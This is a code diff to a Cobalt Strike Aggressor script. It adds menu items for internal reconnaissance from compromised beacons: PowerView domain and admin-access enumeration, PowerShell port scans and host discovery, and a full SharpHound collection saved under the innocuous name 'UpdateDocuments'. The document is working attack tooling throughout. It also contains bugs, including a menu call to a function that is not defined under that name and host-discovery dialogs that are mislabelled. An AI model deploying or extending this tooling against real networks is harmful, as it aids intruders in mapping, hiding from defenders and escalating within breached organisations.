@@ -1,8 +1,8 @@
 # Cobalt Strike Internal Recon Aggressor Script
 # TODO:
-#  Implement more PowerView cmdlets: Get-NetComputer, Get-NetSubnet, Get-NetFileServer, Invoke-FileFinder, Find-LocalAdminAccess 
-#  Implement SPN Scanner with ability to input string to search for, or just *
-#  Implement PS port scanning module 
+#  Implement SMB Scanner module
+#  Implement Linux port scan module
+#  Implement linux responder module
 
 popup beacon_top {
 	menu "&Internal Recon"{
@@ -31,7 +31,25 @@ popup beacon_top {
 					foreach $bid ($1) {
 						getNetDomainController($bid);
 					}
-				}				
+				}		
+				item "&Get-NetComputer" {
+					local('$bid');
+					foreach $bid ($1) {
+						getNetComputer($bid);
+					}
+				}		
+				item "&Get-NetFileServer" {
+					local('$bid');
+					foreach $bid ($1) {
+						getNetFileServer($bid);
+					}
+				}
+				item "&Find-LocalAdminAccess" {
+					local('$bid');
+					foreach $bid ($1) {
+						findLocalAdminAccess($bid);
+					}
+				}
 				item "&Invoke-ShareFinder" {
 					local('$bid');
 					foreach $bid ($1) {
@@ -43,12 +61,48 @@ popup beacon_top {
 					foreach $bid ($1) {
 						invokeUserHunter($bid);
 					}
-				}				
+				}			
+				item "&Get-NetSubnet" {
+					local('$bid');
+					foreach $bid ($1) {
+						getNetSubnet($bid);
+					}
+				}			
 			}
 			item "&SPN Scanner" {
 				local('$bid');
 				foreach $bid ($1) {
 					SPNScanner($bid);
+				}
+			}
+			item "&Port Scan (Fast)" {
+				local('$bid');
+				foreach $bid ($1) {
+					invokePortscanFast($bid);
+				}
+			}
+			item "&Port Scan (Slow)" {
+				local('$bid');
+				foreach $bid ($1) {
+					invokePortscanSlow($bid);
+				}
+			}
+			item "&Host Discovery (Fast)" {
+				local('$bid');
+				foreach $bid ($1) {
+					invokeHostDiscoveryFast($bid);
+				}
+			}
+			item "&Host Discovery (Slow)" {
+				local('$bid');
+				foreach $bid ($1) {
+					invokeHostDiscoverySlow($bid);
+				}
+			}
+			item "&BloodHound" {
+				local('$bid');
+				foreach $bid ($1) {
+					bloodHound($bid);
 				}
 			}
 		}
@@ -88,10 +142,187 @@ sub getNetDomain {
 		bpowerpick($1, $pscmd);
 	}
 	else {
-		berror($1, "PowerView.ps1 must be in the same direcotry as this script.");
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
 	}
 }
 
+sub bloodHound {
+	$bid = $1;
+
+	if (-exists script_resource("SharpHound.ps1")) {
+		bpowershell_import($bid, script_resource("SharpHound.ps1"));
+		$pscmd = "Invoke-BloodHound -CollectionMethod All -ZipFileName UpdateDocuments";
+		bpwd($bid);
+		bpowerpick($1, $pscmd);
+	}
+	else {
+		berror($1, "SharpHound.ps1 must be in the same directory as this script.");
+	}
+}
+
+sub invokePortscanFast {
+	$bid = $1;
+	$dialog = dialog("Port Scan (Fast)", %(hosts => "ip1,ip2,ip3", ports => "port1,port2,port3"), lambda({
+		if ("$3['hosts']" ismatch "ip1,ip2,ip3" || "$3['ports']" ismatch "port1,port2,port3") {
+			berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts and ports.");
+			break;
+		}
+		else {
+			if (-exists script_resource("Invoke-Portscan.ps1")) {
+				bpwd($bid);
+				bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+				bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -Ports '".$3['ports']."' -T3");
+			}
+			else {
+				berror($bid, "Invoke-Portscan.ps1 must be in the same directory as this script.");
+			}
+		}
+	}));
+
+	dialog_description($dialog, "Performs a PowerShell-based portscan with an above-average speed.");
+	
+	drow_text($dialog, "hosts", "Hosts:");
+	drow_text($dialog, "ports", "Ports");
+	
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+sub invokePortscanSlow {
+	$bid = $1;
+	$dialog = dialog("Port Scan (Slow)", %(hosts => "ip1,ip2,ip3", ports => "port1,port2,port3"), lambda({
+		if ("$3['hosts']" ismatch "ip1,ip2,ip3" || "$3['ports']" ismatch "port1,port2,port3") {
+			berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts and ports.");
+			break;
+		}
+		else {
+			if (-exists script_resource("Invoke-Portscan.ps1")) {
+				bpwd($bid);
+				bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+				bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -Ports '".$3['ports']."' -T1");
+			}
+			else {
+				berror($bid, "Invoke-portscanner.ps1 must be in the same directory as this script.");
+			}
+		}
+	}));
+
+	dialog_description($dialog, "Performs a PowerShell-based portscan with a slow speed.");
+	
+	drow_text($dialog, "hosts", "Hosts:");
+	drow_text($dialog, "ports", "Ports");
+	
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+sub invokeHostDiscoveryFast {
+	$bid = $1;
+	$dialog = dialog("Port Scan (Slow)", %(hosts => "ip1,ip2,ip3"), lambda({
+		if ("$3['hosts']" ismatch "ip1,ip2,ip3") {
+			berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts.");
+			break;
+		}
+		else {
+			if (-exists script_resource("Invoke-Portscan.ps1")) {
+				bpwd($bid);
+				bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+				bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -PingOnly -T3");
+			}
+			else {
+				berror($bid, "Invoke-Portscan.ps1 must be in the same directory as this script.");
+			}
+		}
+	}));
+
+	dialog_description($dialog, "Performs a PowerShell-based portscan with a slow speed.");
+	
+	drow_text($dialog, "hosts", "Hosts:");
+	drow_text($dialog, "ports", "Ports");
+	
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+sub invokeHostDiscoverySlow {
+	$bid = $1;
+	$dialog = dialog("Port Scan (Slow)", %(hosts => "ip1,ip2,ip3"), lambda({
+		if ("$3['hosts']" ismatch "ip1,ip2,ip3") {
+			berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts.");
+			break;
+		}
+		else {
+			if (-exists script_resource("Invoke-Portscan.ps1")) {
+				bpwd($bid);
+				bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+				bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -PingOnly -T1");
+			}
+			else {
+				berror($bid, "Invoke-Portscan.ps1 must be in the same directory as this script.");
+			}
+		}
+	}));
+
+	dialog_description($dialog, "Performs a PowerShell-based portscan with a slow speed.");
+	
+	drow_text($dialog, "hosts", "Hosts:");
+	drow_text($dialog, "ports", "Ports");
+	
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+sub getFileServer {
+	$bid = $1;
+
+	if (-exists script_resource("PowerView.ps1")) {
+		bpowershell_import($bid, script_resource("PowerView.ps1"));
+		$pscmd = "Get-NetFileServer";
+		bpowerpick($1, $pscmd);
+	}
+	else {
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
+	}
+}
+
+sub findLocalAdminAccess {
+	$bid = $1;
+
+	if (-exists script_resource("PowerView.ps1")) {
+		bpowershell_import($bid, script_resource("PowerView.ps1"));
+		$pscmd = "Find-LocalAdminAccess";
+		bpowerpick($1, $pscmd);
+	}
+	else {
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
+	}
+}
+
+sub getNetSubnet {
+	$bid = $1;
+
+	if (-exists script_resource("PowerView.ps1")) {
+		bpowershell_import($bid, script_resource("PowerView.ps1"));
+		$pscmd = "Get-NetSubnet";
+		bpowerpick($1, $pscmd);
+	}
+	else {
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
+	}
+}
+
+sub getNetComputer {
+	$bid = $1;
+
+	if (-exists script_resource("PowerView.ps1")) {
+		bpowershell_import($bid, script_resource("PowerView.ps1"));
+		$pscmd = "Get-NetComputer";
+		bpowerpick($1, $pscmd);
+	}
+	else {
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
+	}
+}
 
 sub getNetForest {
 	$bid = $1;
@@ -102,7 +333,7 @@ sub getNetForest {
 		bpowerpick($1, $pscmd);
 	}
 	else {
-		berror($1, "PowerView.ps1 must be in the same direcotry as this script.");
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
 	}
 }
 
@@ -115,7 +346,7 @@ sub getNetDomainControllers {
 		bpowerpick($1, $pscmd);
 	}
 	else {
-		berror($1, "PowerView.ps1 must be in the same direcotry as this script.");
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
 	}
 }
 
@@ -128,7 +359,7 @@ sub invokeShareFinder {
 		bpowerpick($1, $pscmd);
 	}
 	else {
-		berror($1, "PowerView.ps1 must be in the same direcotry as this script.");
+		berror($1, "PowerView.ps1 must be in the same directory as this script.");
 	}
 }
 
@@ -141,7 +372,7 @@ sub invokeUserHunter {
 		bpowerpick($bid, $pscmd);
 	}
 	else {
-		berror($bid, "PowerView.ps1 must be in the same direcotry as this script.");
+		berror($bid, "PowerView.ps1 must be in the same directory as this script.");
 	}
 }
 
@@ -158,7 +389,7 @@ sub SPNScanner {
 				bpowerpick($bid, "Discover-SPNs '".$3['spnstring']."'");
 			}
 			else {
-				berror($bid, "SPNScanner.ps1 must be in the same direcotry as this script.");
+				berror($bid, "SPNScanner.ps1 must be in the same directory as this script.");
 			}
 		}
 	}));
